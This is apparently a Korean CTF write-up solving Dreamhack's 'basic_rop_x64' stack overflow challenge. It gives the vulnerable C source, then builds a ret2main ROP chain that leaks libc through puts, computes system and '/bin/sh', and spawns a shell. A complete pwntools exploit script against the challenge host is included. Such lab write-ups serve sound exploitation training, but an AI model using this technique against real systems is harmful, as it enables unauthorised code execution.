# [Dreamhack] basic_rop_x64

Created: 2022년 12월 7일 오후 1:48
Tags: Pwn

[https://dreamhack.io/wargame/challenges/29/](https://dreamhack.io/wargame/challenges/29/)

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

basic_rop_x86 문제처럼 간단하게 got_overwrite 기법을 사용하여 문제를 풀려고 했습니다. 근데 가젯을 확인해보니 got_overwrite을 할 수 있는 가젯이 없었습니다. 

그래서 ret2main 기법으로 문제를 풀었습니다.

![Untitled](/5%EC%A3%BC%EC%B0%A8/img/basic_rop_x64.png)

일단 익스플로잇을 하는데 필요한 정보들을 구하는 코드를 짰습니다.

- read_got : read함수의 실제주소를 구하기 위함
- puts_plt : read_got을 출력하기 위함
- read_offset : 구한 read의 실제주소에서 lib_base를 구하기위함
(lib_base = read실제주소 - offset)
- system_offset : lib_base에 system_offset을 더해서 system함수 호출 가능
- pop_rdi_ret가젯 : rop를 위함
- main주소 : ret2main기법을 위함

```python
read_got = e.got["read"]
puts_plt = e.plt["puts"]
read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
pop_rdi_ret = 0x0000000000400883
main = 0x00000000004007ba
```

먼저 read_got를 puts로 출력해서 read의 실제주소를 알아내는 코드를 짜주겠습니다.

```python
payload = b"A" * (0x40 + 8)
payload += p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt)
payload += p64(main)
p.send(payload)

p.recvuntil(b"A" * 64)
read_addr = u64(p.recv(6) +b"\x00" * 2)
```

![Untitled](/5%EC%A3%BC%EC%B0%A8/img/basic_rop_x64_1.png)

버퍼의 크기인0x40에 sfp만큼인 8만큼을 더미데이터로 채워줍니다.

그리고 pop_rdi_ret 가젯을 사용하여 read_got를 puts함수를 사용하여 출력해줍니다.

그리고 main함수주소를 넣어 다시 main함수가 실행되게 합니다.

```python
lib_base = read_addr - read_offset
system = lib_base + system_offset
binsh = lib_base + 0x18cd57
```

lib_base, system 함수의 주소를 구하는 코드입니다.

`strings -tx libc.so.6 | grep "/bin/sh”` 명령어로 lib_base에서 `/bin/sh` 까지의 오프셋을 알수있습니다.

![Untitled](/5%EC%A3%BC%EC%B0%A8/img/basic_rop_x64_2.png)

이제 모든걸 구하고 main함수가 실행되니 간단하게 bof를 발생시켜서 /bin/sh을 인자로 system함수를 실행시키면 해결 됩니다.

```python
payload = b"A" * (0x40 + 8)
payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)
p.send(payload)
p.interactive()
```

### 최종 코드

```python
from pwn import *

#p = process("./basic_rop_x64")
p = remote("host3.dreamhack.games", 23748)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")

def slog(name, addr):
  return success(": ".join([name, hex(addr)]))

read_got = e.got["read"]
puts_plt = e.plt["puts"]
read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
pop_rdi_ret = 0x0000000000400883
main = 0x00000000004007ba

payload = b"A" * (0x40 + 8)
payload += p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt)
payload += p64(main)
p.send(payload)

p.recvuntil(b"A" * 64)
read_addr = u64(p.recv(6) +b"\x00" * 2)
lib_base = read_addr - read_offset
system = lib_base + system_offset
slog("lib_base", lib_base)
slog("system", system)
binsh = lib_base + 0x18cd57

payload = b"A" * (0x40 + 8)
payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)
p.send(payload)
p.interactive()
```

### 실행화면

![Untitled](/5%EC%A3%BC%EC%B0%A8/img/basic_rop_x64_3.png)